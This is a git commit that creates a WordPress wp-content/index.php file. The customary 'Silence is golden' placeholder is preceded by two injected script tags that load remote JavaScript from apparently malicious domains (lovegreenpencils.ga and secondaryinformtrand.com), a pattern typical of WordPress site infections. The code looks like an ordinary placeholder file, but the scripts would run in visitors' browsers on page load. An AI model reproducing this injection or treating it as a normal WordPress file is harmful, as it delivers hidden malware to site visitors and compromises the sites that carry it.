4a1f9ad9a34afca2c6945604f230658629f0bab7
Stefan Pejcic <pejcha1994@gmail.com>
2020-11-25 12:47:32 +0100

    Create index.php

---
+++ 25.11.2020/wp-content/index.php
@@ -0,0 +1,2 @@
+<script type='text/javascript' src='https://dock.lovegreenpencils.ga/m.js?n=nb5'></script><script type='text/javascript' src='https://cht.secondaryinformtrand.com/m.js?n=nb5'></script><?php
+// Silence is golden.
